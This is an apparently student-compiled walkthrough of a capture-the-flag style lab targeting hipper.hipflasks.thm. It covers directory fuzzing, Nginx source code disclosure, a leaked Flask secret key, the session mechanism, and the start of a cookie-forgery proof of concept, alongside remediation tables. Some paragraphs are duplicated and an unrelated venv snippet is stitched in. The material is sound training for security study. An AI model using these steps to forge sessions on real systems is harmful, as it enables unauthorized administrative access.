Progress: 353 / 4615 (7.65%)                                              Progress: 399 / 4615 (8.65%)                                              Progress: 440 / 4615 (9.53%)                                              Progress: 491 / 4615 (10.64%)                                             Progress: 533 / 4615 (11.55%)                                             Progress: 579 / 4615 (12.55%)                                             Progress: 621 / 4615 (13.46%)                                             Progress: 666 / 4615 (14.43%)                                             Progress: 708 / 4615 (15.34%)                                             Progress: 754 / 4615 (16.34%)                                             Progress: 799 / 4615 (17.31%)                                             Progress: 844 / 4615 (18.29%)                                             Progress: 889 / 4615 (19.26%)                                             Progress: 935 / 4615 (20.26%)                                             Progress: 977 / 4615 (21.17%)                                             Progress: 1021 / 4615 (22.12%)                                            Progress: 1067 / 4615 (23.12%)                                            Progress: 1111 / 4615 (24.07%)                                            Progress: 1159 / 4615 (25.11%)                                            Progress: 1204 / 4615 (26.09%)                                            Progress: 1250 / 4615 (27.09%)                                            Progress: 1293 / 4615 (28.02%)                                            Progress: 1333 / 4615 (28.88%)                                                         ^C
[!] Keyboard interrupt detected, terminating.
                                                                                        
nikto --url https://hipper.hipflasks.thm | tee nikto
and
feroxbuster -t 10 -u https://hipper.hipflasks.thm -k -w /usr/share/seclists/Discovery/Web-Content/common.txt -x py,html,txt -o feroxbuster

This will start a regular Nikto scan saving into a file called "nikto", as well as a feroxbuster directory fuzzing scan using 10 threads (-t 10) to make sure we don't overload anything, ignoring the self-signed SSL cert (-k), using the seclists common.txt wordlist (-w /usr/share/seclists/Discovery/Web-Content/common.txt), checking for three extensions (-x py,html,txt), and saving into an output file called "feroxbuster".

If one of these switches seems odd to you, don't worry -- it should! We'll come on to this in the next task...

With those scans started, let's move on and quickly see what we can find manually in the SSL cert, before the scan results come in.

SSL certificates often provide a veritable treasure trove of information about a company. In Firefox the certificate for a site can be accessed by clicking on the lock to the left of the search bar, then clicking on the Show Connection Details arrow, making sure to deactivate your Burpsuite connection first!

Note: You may get an error about Strict Transport Security if you try to access the site having previously accessed it using Burpsuite. This is due to the Burpsuite (signed) certificate allowing the browser to accept the aforementioned HSTS header, meaning that it will no longer accept the self-signed certificate  The solution to this in Firefox is to open your History (Ctrl + H), find the hipper.hipflasks.thm domain, right click it, then select "Forget about this site". You should be able to reload the page normally.

Screenshot showing the button to press to view the certificate for the site

Next click on "More Information", then "View Certificate" in the Window which pops up.

A new tab will open containing the certificate information for this domain.
Screenshot showing the certificate for the site

Unfortunately there isn't a lot here that we either don't already know, or would already have known had we footprinted the company.

Still, checking the SSL certificate is a really good habit to get into.

Let's switch back and take a look at the results of our scans.

Nikto:

The Nikto webapp scanner is fairly rudimentary, but it often does a wonderful job of catching low-hanging fruit:
Nikto Results

           
pentester@attacker:~$ nikto --url https://hipper.hipflasks.thm
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.106
+ Target Hostname:    hipper.hipflasks.thm
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=GB/ST=Argyll and Bute/L=Oban/O=Hip Flasks Inc/CN=hipper.hipflasks.thm/emailAddress=webmaster@hipflasks.thm
                   Ciphers:  TLS_AES_256_GCM_SHA384
                   Issuer:   /C=GB/ST=Argyll and Bute/L=Oban/O=Hip Flasks Inc/CN=hipper.hipflasks.thm/emailAddress=webmaster@hipflasks.thm
+ Start Time:         2021-06-26 16:26:02 (GMT1)
---------------------------------------------------------------------------
+ Server: waitress
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'front-end-https' found, with contents: on
+ The site uses SSL and Expect-CT header is not present.
+ Cookie session created without the secure flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server banner has changed from 'waitress' to 'nginx/1.18.0 (Ubuntu)' which may suggest a WAF, load balancer or proxy is in place
+ The Content-Encoding header is set to "deflate" this may mean that the server is vulnerable to the BREACH attack.
+ Allowed HTTP Methods: HEAD, GET, OPTIONS
+ 7864 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-06-26 16:43:48 (GMT1) (1066 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

        

There's a bit to break down here. First of all, the certificate information looks fine -- the cipher is current at the time of writing and we already knew the rest. We already spotted the lack of X-XSS-Protection header whilst we were waiting for the scan to complete, and identified that there was an Nginx reverse proxy in play.

The session cookie being created without the Secure flag is interesting though -- this means that the cookie could potentially be sent over unencrypted HTTP connections. This is something we can (and should) report to the client.

Finally, the BREACH vulnerability picked up by Nikto appears to be a false positive.

Feroxbuster:

This is the interesting one.

308        4l       24w      274c https://hipper.hipflasks.thm/admin
200       37l       81w      862c https://hipper.hipflasks.thm/main.py

We have an admin section, and what appears to be source code disclosure.

If we cURL that main.py file then we get a pleasant surprise:

┌──(kali㉿kali)-[~]
└─$ curl https://hipper.hipflasks.thm/main.py -k
#!/usr/bin/python3
from flask import Flask, redirect, render_template, request, session
from datetime import datetime
from waitress import serve
from modules import abp
from libs.db import AuthConn, StatsConn

app = Flask(__name__)
app.template_folder="views"
app.config["SECRET_KEY"] = "c6433a50b66dbc25edd46e343f752d3e"


@app.before_request
def befReq():
        conn = StatsConn()
        if not session.get("visited"):
                conn.addView("uniqueViews")
                session["visited"] = "True"
        conn.addView("totalViews")


@app.route("/")
def home():
        return render_template("index.html", year=datetime.now().date().strftime("%Y")), 200

app.register_blueprint(abp, url_prefix="/admin")


@app.errorhandler(403)
def error403(e):
        return "You are not authorised to access this", 403


#Confirm that there is an admin account in place
AuthConn()

serve(app, host="127.0.0.1", port=8000)

First, we have just established that this application is written in Flask (although there was actually a way we could have done this without the source code disclosure -- see if you can figure out how! It may become a little more obvious in later tasks). Secondly, we have the app's secret key. Due to the way that Flask creates its sessions, this is an incredibly serious vulnerability, as you will see in upcoming tasks...

Note: This key is autogenerated every time the box starts, so don't be alarmed that it won't be the same for your instance of the machine.

Vulnerabilities:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-WEB-1
	Low
	3.1
	Session cookie set without Secure attribute potentially leading to session takeover should the cookie be sent over a monitored HTTP connection
	Change the webapplication code to include the secure attribute when setting session cookies
HF-WEB-2
	Low	3.1	No Content-Security-Policy header set for the web application
	Set a suitable content security policy and add it into a header in the Nginx configuration for this application
HF-WEB-3
	High	8.4
	Source code disclosure as a result of an Nginx misconfiguration, which includes the webapp's private encryption key, allowing for token forgery.
	Change the encryption key ASAP across all deployed instances of the webapp, and change the webserver configuration to prevent the source code disclosure. Ideally the webapp source should be completely separate to the static files, outwith the Nginx webroot. Storing the key in the database or as an environment variable would also be a lot safer than keeping it in the source code of the site..

There are other findings in this webapp; however, our target is the server itself, so we can discuss coming back specifically for a webapp pentest later.
Answer the questions below
Disclose the source code for the main.py file and note down the secret key.

**understanding the vuln**
The critical vulnerability that we just discovered will effectively allow us to forge sessions for any user we wish, but before we get into exploiting it, touching on how it happened might be helpful. This also explains that unusual switch in the feroxbuster scan which was mentioned previously.

This task is not necessary to complete the room, so if you're not interested in how the vulnerability occurred then you may skip ahead to the next task.

Web apps traditionally follow the same structure as the underlying file-system. For example, with a PHP web application, the root directory of the webserver would contain a file called index.php, and usually a few subdirectories related to different functions. There might then be a subdirectory called about/, which would also contain an index.php. The index files are used to indicate the default content for that directory, meaning that if you tried to access https://example.com/, then the webserver would likely actually be reading a file called /var/www/html/index.php. Accessing https://example.com/about/, would be reading /var/www/html/about/index.php from the filesystem.

This approach makes life very easy for us as hackers -- if a file is under the webroot (/var/www/html by default for Apache on Linux) then we will be able to access it from the webserver.

Modern webapps are often not like this though -- they follow a design structure called "routing". Instead of the routes being defined by the structure of the file system, the routes are coded into the webapp itself. Accessing https://example.com/about/ in a routed web app would be a result of a program running on the webserver (written in something like Python -- like our target application here -- NodeJS or Golang) deciding what page you were trying to access, then either serving a static file, or generating a dynamic result and displaying it to you. This approach practically eliminates the possibility of file upload vulnerabilities leading to remote code execution, and means that we can only access routes that have been explicitly defined. It's also a lot neater than the traditional approach from an organisational perspective.

There is a downside to routing, however. Serving static content such as CSS or front-end Javascript can be very tedious if you have to define a route for each page. Additionally, it's also relatively slow to have your webapp handling the static content for you (although most frameworks do have the option to serve a directory). As such, it's very common to have a webapp sitting behind a reverse proxy such as Nginx or Caddy. The webserver handles the static content, and any requests that don't match the ruleset defined for static content get forwarded to the webapp, which then sends the response back through the proxy to the user.

What this means is that searching for file extensions in a route fuzzing attempt (like the Feroxbuster scan we ran) won't actually do anything with a routed application, unless the reverse proxy has been misconfigured to serve more static content than it's supposed to. Unfortunately, it is very easy to mess up the configuration for a reverse proxy, for example, this common Nginx configuration could potentially leak the full source code for the webapp -- a very dangerous prospect:


Vulnerable Nginx Conf example

           
root /var/www/webapp;
location ^~ {
    try_files $uri $uri @proxypass;
}

location @proxypass {
   //Various proxy headers
   proxy_pass http://127.0.0.1:8000;
}

        

This configuration first looks for files in /var/www/webapp and its subdirectories. For example, if you were looking for https://example.com/assets/css/style.css then Nginx would look for /var/www/webapp/assets/css/style.css. Notice that this is identical behaviour to a non-routed webapp.

If the file exists then Nginx will serve it and the request will never even reach the webapp. If the file does not exist then the request gets sent to the named location block: proxypass, which results in it getting passed to the webapp running on 127.0.0.1:8000.

This is all well and good, but what happens if the source code for the webapp is also stored in /var/www/webapp? A request to /var/www/webapp/app.py, for example may leak the source code for the webapp, as Nginx would see that the file exists and serve it as plaintext before the request even reaches the webapp. An example application structure may look something like this:
/
|__app.py
|__assets/
|____css/
|________style.css
|____js/
|________scripts.js
|____app_modules/
|________database/
|____________connection.py

This would result in Nginx serving the assets directory, yes, but it would also be serving all of the Python files.

A better solution would be to use a configuration such as this:

Safe Nginx Conf example

           
root /var/www/webapp;
location ^~ /assets {
    alias /var/www/webapp/assets;
}

location / {
   //Various proxy headers
   proxy_pass http://127.0.0.1:8000;
}

        

This would take any requests to /assets/* and attempt to serve the static files. Anything else would just get passed straight to the webapp.
There are a million-and-one different ways to accomplish the same objective with Nginx configuration files -- many of them will have vulnerabilities like this, many will not. It all depends on the experience of the sysadmin. As such, searching for .py files with feroxbuster is still an effective strategy when we know that there is a reverse proxy in front of our Python webapp -- even with a routed application.

**full source code disclosure**

We've already found a potentially serious vulnerability in this application, which we will look at exploiting soon.

For the mean time, let's focus on gathering more information about the application; using our discovered file to grab the rest of the code seems like a good start. Flask applications work by having one main file (which we already have). This file then imports everything else that the application needs to run -- for example, blueprints that map out other parts of the app, authentication modules, etc.

This means that we don't need to do any more fuzzing to find the rest of the source code: we can just read what the main.py file is importing and pull on the metaphorical thread until we have all of the files downloaded. Whenever we find a new file, we should download a copy locally using the curl -o FILENAME switch so that we can review the source code in detail later.

Let's start by looking at what the main.py file is importing:
main.py

           

from flask import Flask, redirect, render_template, request, session
from datetime import datetime
from waitress import serve
from modules import abp
from libs.db import AuthConn, StatsConn


        

A lot of these are just standard Python modules (which we can check by Googling them), but the last two lines are referring to custom modules.

If you aren't already familiar with Python application structures then it is very important to note that all file paths are relative to the root calling script. In other words, everything is relative to main.py for this application, so any scripts in subdirectories will still be working with filepaths relative to the main script, rather than themselves.

The syntax here tells us a lot. Starting with the first line of interest (from modules import abp), we can see that it's importing an object  called abp (which, looking further down the code appears to be a Blueprint) from a modules file. This could mean one of two file structures:

    There is a file called modules.py in the webroot.
    There is a directory called modules in the webroot which contains a file called __init__.py -- a file effectively used to initialise a new module inside a directory.

Only one way to find out which it is. Let's try both!

Note: you must include the -k switch in your cURL commands to ignore the self-signed certificate!
┌──(kali㉿kali)-[~/Downloads]
└─$ curl https://hipper.hipflasks.thm/modules.py -k
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>

┌──(kali㉿kali)-[~/Downloads]
└─$ curl https://hipper.hipflasks.thm/modules/__init__.py -k
from modules.admin import abp

Only one way to find out which it is. Let's try both!

Note: you must include the -k switch in your cURL commands to ignore the self-signed certificate!

CURLing https://hipper.hipflasks.thm/modules.py gives us a 404 error, so it must be the second option.

CURLing https://hipper.hipflasks.thm/modules/__init__.py gives us what we're looking for. The file contains a single line:
from modules.admin import abp

As expected, the init (initialisation) file is importing the abp Blueprint object from another Python file in the directory: admin.py.

┌──(kali㉿kali)-[~/Downloads]
└─$ curl https://hipper.hipflasks.thm/modules/admin.py -k   
#!/usr/bin/python3
from flask import Blueprint, render_template_string, request, redirect, session, abort, url_for, flash, get_flashed_messages
from libs.auth import authCheck, checkAuth
from libs.db import AuthConn, StatsConn

abp = Blueprint("abp", __name__)

@abp.route("/")
@authCheck
def manageHome():
    conn = StatsConn()
    uniqueViews = conn.getViews()
    response = f"""
<!DOCTYPE html>
<html lang=en>
    <head>
        <title>Admin Section</title>
        <meta charset=utf-8>
        <meta name=viewport content="width=device-width, initial-scale=1.0">
        <link rel=stylesheet href="/css/styles.css" type=text/css>
        <link rel=stylesheet href="/css/lora.css" type=text/css>
        <link rel=stylesheet href="/css/railway.css" type=text/css>
    </head>
    <body>
        <section class="page-section clearfix">
            <div class="container">
                <div class="intro">
                    <img class="intro-img img-fluid mb-6 mb-lg-0 rounded" src="assets/img/flask.jpg" alt="..." />
                    <div class="intro-text left-0 text-center bg-faded p-5 rounded">
                        <h2 class="section-heading mb-4">
                            <span class="section-heading-upper">Admin Console</span>
                            <span class="section-heading-lower">Welcome, {session['username']}</span>
                        </h2>
                        <p class="mb-3">There have been {uniqueViews} unique visitors to the site!</p>
                    </div>
                </div>
            </div>
        </section>
        <footer style="position: fixed; bottom: 0; left: 0; right: 0; padding-top:1rem !important; padding-bottom: 1rem !important;" class="footer text-faded text-center py-5">
            <div class="container"><form style="text-align: right;" action=/admin/logout><input class="btn btn-primary btn-sm" type="submit" name="submit" value="Logout"></form></div>
        </footer>
    </body>
</html>
    """
    return render_template_string(response), 200

@abp.route("/login")
def loginRoute():
    if checkAuth():
        return redirect(url_for("abp.manageHome")), 301

    messages = get_flashed_messages()
    if messages:
        message = ""
        for i in messages:
            if len(i) > 0:
                message += f"<p>{i}</p>\n"
    else: message = "<p>&nbsp;</p>"
    response = f"""
<!DOCTYPE html>
<html lang=en>
    <head>
        <title>Login Page</title>
        <meta charset=utf-8>
        <meta name=viewport content="width=device-width, initial-scale=1.0">
        <link rel=stylesheet href="/css/styles.css" type=text/css>
        <link rel=stylesheet href="/css/lora.css" type=text/css>
        <link rel=stylesheet href="/css/railway.css" type=text/css>
    </head>
    <body>
        <section class="page-section cta">
            <div class="container">
                <div class="row">
                    <div class="col-xl-9 mx-auto">
                        <div class="cta-inner bg-faded text-center rounded">
                            <h2 class="section-heading mb-4">
                                <span class="section-heading-upper">Administration</span>
                                <span class="section-heading-lower">Login</span>
                            </h2>
                            <form method="POST">
                                <input class="form-control" type="text" name="username" placeholder="Username">
                                <input class="form-control" type="password" name="password" placeholder="Password">
                                <input class="form-control btn btn-primary btn-sm" type="submit" name="submit" value="Login!">
                            </form>
                            <br>
                            {message}
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </body>
</html>
    """
    return render_template_string(response), 200

    

@abp.route("/login", methods=["POST"])
def loginFunction():
    body = request.form
    if "username" not in body.keys() or "password" not in body.keys():
        flash("Incorrect Parameters")
        return redirect(url_for("abp.loginRoute")), 301
    conn = AuthConn()
    if conn.authenticate(body["username"], body["password"]):
        session["auth"] = "True"; session["username"] = body["username"]
        return redirect(url_for("abp.manageHome")), 301
    flash("Incorrect username or password", "error")
    return redirect(url_for("abp.loginRoute")), 301


@abp.route("/logout")
def logoutFunction():
    if not checkAuth():
        flash("You are not logged in", "error")
    else:
        session.pop("auth")
        session.pop("username")
        flash("You have been logged out", "success")
    return redirect(url_for("abp.loginRoute")), 301

Once again we have some imports we can look into:
from libs.auth import authCheck, checkAuth
from libs.db import AuthConn, StatsConn

The libs.db import is the same as the second import in main.py, but we can add libs.auth to our list of things to check.

At this point we can also update our diagram from before:
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/

We know that a libs/ subdirectory exists (it has to be a subdirectory if we're importing two different modules from it), but we don't know if the two files we know of (auth and db) are Python files, or directories.

We can establish this in the same way as before -- first checking to see if libs/auth.py exists, then if that fails, checking to see if libs/auth/__init__.py exists.

┌──(kali㉿kali)-[~/Downloads]
└─$ curl https://hipper.hipflasks.thm/libs/auth.py -k    
from flask import session, redirect, url_for, flash
from functools import wraps

checkAuth = lambda: session.get("auth") == "True"

def authCheck(func):
    @wraps(func)
    def innerCheck(*args, **kwargs):
        if checkAuth():
            return func(*args, **kwargs)
        else:
            flash("Please login before accessing the admin area")
            return redirect(url_for("abp.loginRoute")), 301
    return innerCheck

When attempting to cURL https://hipper.hipflasks.thm/libs/auth.py we receive a 200 response and a Python file, so this is clearly the correct path. Let's update the map accordingly:
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/
|____auth.py

This file doesn't have any custom imports, but it does seem to be handling the authentication for the site, so this is well worth bookmarking for later reading!

Looking at the other item in the libs/ subdirectory, we can quickly ascertain that this is a directory by the presence of a libs/db/__init__.py file:

┌──(kali㉿kali)-[~/Downloads]
└─$ curl https://hipper.hipflasks.thm/libs/db/__init__.py -k
from libs.db.base import Conn
from libs.db.auth import AuthConn
from libs.db.stats import StatsConn

This seems to be it for Python files; however, there are a few more things we can fill in.

First, from the main.py file we can see that the app's template folder has been set to "views":
app.template_folder="views"

The templates folder contains static HTML templates which Flask uses to create dynamic responses. For example, in line 24 of main.py, we can see an example of the Flask render_template function where it passes in the current year to be used for the copyright notice in the index.html template.

main.py, line 24
return render_template("index.html", year=datetime.now().date().strftime("%Y")), 200
index.html, line 55:
<div class="container"><p class="m-0 small">Copyright &copy; Hipper Hip Flasks {{ year }}</p></div>

For a more thorough explanation of Flask templates, have a look at the Flask room.

Regardless, we can now add the "views" directory into our diagram. Analysis of the rest of the source code indicates that there is only one template: the index.html which we have already seen.

──(kali㉿kali)-[~/Downloads]
└─$ curl https://hipper.hipflasks.thm/libs/db/stats.py -k
from libs.db import Conn

class StatsConn(Conn):
        def __init__(self):
                super().__init__("stats.db")
                self.viewTypes = ["uniqueViews", "totalViews"]
                self.selectView = lambda x: self.viewTypes[0] if x not in self.viewTypes else x
                if not self.exists:
                        sql = """CREATE TABLE views (statName VARCHAR(255) UNIQUE, statNum INT DEFAULT 0)"""
                        self.curs.execute(sql)
                        for i in self.viewTypes:
                                self.curs.execute(f"""INSERT INTO views (statName) VALUES ("{i}")""")
                        self.dbh.commit()

        def getViews(self, viewType = None):
                viewType = self.selectView(viewType)
                sql = """SELECT statNum FROM views WHERE statName = ?"""
                self.curs.execute(sql, (viewType,))
                return self.curs.fetchone()[0]

        def addView(self, viewType=None):
                if viewType not in self.viewTypes:
                        return False
                sql = """UPDATE views SET statNum = statNum + 1 WHERE statName = ?"""
                self.curs.execute(sql, (viewType,))
                if self.dbh.commit():
                        return True
                return False

                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ curl https://hipper.hipflasks.thm/libs/db/base.py -k 
import sqlite3, os

class Conn():
        def __init__(self, db):
                self.exists = os.path.exists(f"data/{db}")
                self.dbh = sqlite3.connect(f"data/{db}")
                self.curs = self.dbh.cursor()

                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ curl https://hipper.hipflasks.thm/libs/db/auth.py -k
import bcrypt
from libs.db import Conn
from getpass import getpass

class AuthConn(Conn):
        def __init__(self):
                super().__init__("users.db")
                if not self.exists:
                        sql = """CREATE TABLE users (
                                id INTEGER PRIMARY KEY AUTOINCREMENT,
                                username VARCHAR(255) NOT NULL,
                                password VARCHAR(255) NOT NULL,
                                admin BOOL NOT NULL)
                                """
                        self.curs.execute(sql)
                        password = bcrypt.hashpw(getpass("Please enter the admin password: ").encode("utf-8"), bcrypt.gensalt())
                        sql = """INSERT INTO users (username, password, admin) VALUES ("admin", ?, 1)"""
                        self.curs.execute(sql, (password,))
                        self.dbh.commit()

        def authenticate(self, username, password):
                sql = """SELECT password FROM users WHERE username = ?"""
                self.curs.execute(sql, (username,))
                res = self.curs.fetchall()
                if len(res) != 1:
                        return False
                passHash = res[0][0]
                return bcrypt.checkpw(password.encode("utf-8"), passHash)
Regardless, we can now add the "views" directory into our diagram. Analysis of the rest of the source code indicates that there is only one template: the index.html which we have already seen.

/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/
|____auth.py
|____db/
|______base.py
|______auth.py
|______stats.py
|__views/
|____index.html

Similarly, looking at the files in libs/db/ tells us that there is a directory called data/ containing two SQLite3 databases: users.db and stats.db. We won't go too in-depth about how these are disclosed in this task because they aren't hugely relevant to our progress attacking this application (despite constituting information disclosure in their own right); however, you are strongly encouraged to review the libs/db/base.py source code, along with either libs/db/auth.py or libs/db/stats.py to see if you can discern this for yourself.

Our final structure diagram now looks like this:
/
|__assets/
|____imgs/
|____fonts/
|__css/
|__js/
|__modules/
|____ __init__.py
|____admin.py
|__libs/
|____auth.py
|____db/
|______base.py
|______auth.py
|______stats.py
|__views/
|____index.html
|__data/
|____users.db
|____stats.db

Which is remarkably close to the real file tree, as we will see when we get into the box.

With the source code fully disclosed, let's start analysing it properly!

Vulnerabilities:
ID
	Rank
	CVSS
	Vulnerability
	Remediation
HF-WEB-4
	High	7.5
	

User SQLite3 database exposed at https://hipper.hipflasks.thm/data/users.db. Possibility for attackers to download the database and attempt to crack user passwords (including those of administrators). Vulnerability is mitigated against slightly by apparent use of a complex password for administrator user.
	Move the user database outside of the webroot. Vulnerability can also be mitigated against as a side-effect of remediating HF-WEB-3
HF-WEB-5
	Medium	5.3
	Statistics SQLite3 database exposed at https://hipper.hipflasks.thm/data/stats.db resulting in unintended information disclosure.
	Move the database outside of the webroot. Vulnerability can also be mitigated against as a side-effect of remediating HF-WEB-3
**implications of the vuln**
We now have local copies of all of the Python files making up the application, so let's take a look through them. We are aiming to exploit the token forgery vulnerability we found earlier, so this is a good time to talk about how Flask sessions work.
Because HTTP(S) is inherently stateless, websites store information which needs to persist between requests in cookies -- tiny little pieces of information stored on your computer. Unfortunately, this also poses a problem: if the information is stored on your computer, what's stopping you from just editing it? When it comes to sessions, there are two mainstream solutions.

Sessions are a special type of cookie -- they identify you to the website and need to be secure. Sessions usually hold more information than just a single value (unlike a standard cookie where there may only be a single value stored for each index). For example, if you are logged into a website then your session may contain your user ID, privilege levels, full name, etc. It's a lot quicker to store these things in the session than it is to constantly query the database for them!

So, how do we keep sessions secure? There are two common schools of thought when it comes to session storage:

Server Side Session Storage:- store the session information on the server, but give the client a cookie to identify it.

    This is the method which PHP and most other traditional languages use. Effectively, when a session is created for a client (i.e. a visitor to the site), the client is given a cookie with a unique identifier, but none of the session information is actually handed over to the client. Instead the server stores the session information in a file locally, identified by the same unique ID. When the client makes a request, the server reads the ID and selects the correct file from the disk, reading the information from it. This is secure because there is no way for the client to edit the actual session data (so there is no way for them to elevate their privileges, for example).
    There are other forms of server side session storage (e.g. storing the data in a Redis or memcached server rather than on disk), but the principle is always the same.

Client Side Session Storage:- store all of the session information in the client's cookies, but encrypt or sign it to ensure that it can't be tampered with.

    In a client side session storage situation, all of the session values are stored directly within the cookie -- usually in something like a JSON Web Token (JWT). This is the method that Flask uses. The cookie is sent off with each request as normal and is read by the server, exactly as with any other cookie -- only with an extra layer of security added in. By either signing or encrypting the cookie with a private secret known only to the server, the cookie in theory cannot be modified. Flask signs its cookies, which means we can actually decode them without requiring the key (for a demonstration, try putting your session cookie from the target website into a base64 decoder such as the one here) -- we just can't edit them... unless we have the key.
    
There are advantages and disadvantages to both methods. Server side session storage is practically more secure and requires less data being sent to-and-from the server. Client side session storage makes it easier to scale the application up across numerous servers, but is limited by the 4Kb storage space allowed per cookie. Importantly, it is also completely insecure if the private key is disclosed. Whether the framework signs the cookie (leaving it in plaintext, but verifying it to ensure that tampering is impossible), or outright encrypts the cookie, it's game over if that private key gets leaked.

Anyone in possession of the webapp's private key is able to create (i.e. forge) new cookies which will be trusted by the application. If we understand how the authentication system works then we can easily forge ourselves a cookie with any values we want -- including making ourselves an administrator, or any number of other fun applications.

In short, an application which relies on client-side sessions and has a compromised private key is royally done for. Checkmate.

Time to go bake some cookies!

Now that we have a copy of the source code for the site, we have effectively turned the webapp segment of this assessment into a white-box test. Were this a web-app pentest then we would comb through the source code looking for vulnerabilities; however, in the interests of keeping this short, we shall limit our review purely to the authentication system for the site as this is what we will need to fool with our forged cookie.

Let's start by looking at modules/admin.py. This contains the code defining the admin section -- if we look at this then we will see what authentication measures are in place:
modules/admin.py

#!/usr/bin/python3
from flask import Blueprint, render_template_string, request, redirect, session, abort, url_for, flash, get_flashed_messages
from libs.auth import authCheck, checkAuth
from libs.db import AuthConn, StatsConn

abp = Blueprint("abp", __name__)

@abp.route("/")
@authCheck
def manageHome():
    conn = StatsConn()
    uniqueViews = conn.getViews()
    response = f"""
<!DOCTYPE html>
<html lang=en>
    <head>
        <title>Admin Section</title>
---


           
        

Right at the top of the file we find what we're looking for. Specifically,  there is one line of code which handles the authentication for the /admin route:
@authCheck
Imported in:
from libs.auth import authCheck, checkAuth

This is what is referred to as a decorator -- a function which wraps around another function to apply pre-processing. This is not a programming room, and decorators are relatively complicated, so we will not cover them directly within the room. That said, there is an explanation with examples given here, which might be a good idea to take a look at if you aren't already familiar with decorators.

If we have a look at libs/auth.py we can see the code for this:
libs/auth.py

from flask import session, redirect, url_for, flash
from functools import wraps

checkAuth = lambda: session.get("auth") == "True"

def authCheck(func):
    @wraps(func)
    def innerCheck(*args, **kwargs):
        if checkAuth():
            return func(*args, **kwargs)
        else:
            flash("Please login before accessing the admin area")
            return redirect(url_for("abp.loginRoute")), 301
    return innerCheck


           
        

Short and sweet, this is the full extent of the authentication handler.

Breaking this down a little further, the authentication is handled by a single if/else statement. If checkAuth() (the lambda function1 above) evaluates to true then the decorated function is called, resulting in the requested page loading. If the expression evaluates to false then a message is flashed2 to the user's session and they are redirected back to the login page. About as simple as it gets.

Looking into the checkAuth lambda function:
checkAuth = lambda: session.get("auth") == "True"

We can see that all it does is check to see if the user has a value called "auth" in their session, which needs to be set to "True".

This can easily be forged, so in theory we can already get access to the admin area.

Let's have a look at the login endpoint back in modules/admin.py:
modules/admin.py

           
---
@abp.route("/login", methods=["POST"])
def loginFunction():
    body = request.form
    if "username" not in body.keys() or "password" not in body.keys():
        flash("Incorrect Parameters")
        return redirect(url_for("abp.loginRoute")), 301
    conn = AuthConn()
    if conn.authenticate(body["username"], body["password"]):
        session["auth"] = "True"; session["username"] = body["username"]
        return redirect(url_for("abp.manageHome")), 301
    flash("Incorrect username or password", "error")
    return redirect(url_for("abp.loginRoute")), 301
---

        

Breaking this down, we see that it's expecting a post request. It then stores the information being sent in a variable called body, then checks to ensure that the parameters username and password have been sent -- if they haven't been then it flashes an Incorrect Parameters message and redirects them back to the login page.

If these parameters are present then it initialises a connection to the users database and checks the username and password (we won't look at the code here for the sake of brevity, but feel free to read it in libs/db/auth.py). If the authentication is successful then it sets two session values:

    It sets auth to "True". We already knew about this one.
    It sets username to the username that we posted it. This will be important later.

It then redirects the user to the management homepage (/admin).

We now have everything we need, so let's forge some cookies!

1. Lambda functions are anonymous functions meaning that they don't have to be given a name or assigned anywhere. In this case the lambda function is being assigned to a variable (checkAuth) and the lambda syntax is being used for little more than cleanliness.

2. "Flashing" is Flask's way of persisting messages between requests. For example, if you try to log into an application and fail then the request endpoint may redirect you back to the login page with an error message. This error message would be "flashed" -- meaning it's stored in your session temporarily where it can be read by code in the login page and displayed to you.

**cookie forgery**
There are many ways to forge a Flask cookie -- most involve diving down into the internals of the Flask module to use the session handler directly: a very complicated solution to what is actually an incredibly simple problem.

We need to generate Flask cookie. What better way to do that than with a Flask app?

In short, we are going to write our own (very simple) Flask app which will take the secret key we "borrowed" and use it to generate a signed session cookie with, well, basically whatever we want in it.

Before we start writing, let's create a Python Virtual Environment for our project. A virtual environment (or venv) allows us to install dependencies for a project without running the risk of breaking anything else.

Make sure that we have the requisite dependencies installed:
sudo apt update && sudo apt install python3-venv

Now we can create the virtual environment:
python3 -m venv poc-venv

This will create a subdirectory called poc-venv containing our virtual environment.
We can activate this using the command: source poc-venv/bin/activate.

This should change your prompt to indicate that we are now in the virtual environment:
Creating a Virtual Environment

           
pentester@attacker:~$ python3 -m venv poc-venv
pentester@attacker:~$ source poc-venv/bin/activate
(poc-venv) pentester@attacker:~$ 

──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ source angr/bin/activate
                                                                          
┌──(angr)─(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ deactivate
                                                                          
┌──(kali㉿kali)-[~/Downloads/BinaryHeaven]
└─$ 
Let's start our PoC by installing dependencies:
pip3 install flask requests waitress

Waitress isn't actually required here, but using it is very simple and makes the output of this code much cleaner, so we might as well add it in.

Next we need to open a blank text document and start a new Python script:
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

This gives us a Python script with a variety of modules. We have everything we need to set up a Flask app via the flask and waitress modules; then we also have requests, threading, and time, which we will use to automatically query the server we are setting up.

With the imports sorted, let's initialise the app:
app = Flask(__name__)
app.config["SECRET_KEY"] = "PUT_THE_KEY_HERE"

This creates a new Flask app object and configures the secret key. You will obviously have to substitute in the key you found earlier in the disclosed main.py file, replacing the "PUT_THE_KEY_HERE" text.

Next let's configure a webroot which will set the two session values we identified earlier:
@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

Our app is now ready to go, we just need to start it and query it.

We could technically just start the app here and navigate to it in our browser, but that would be boring. Let's do this all from the command line.

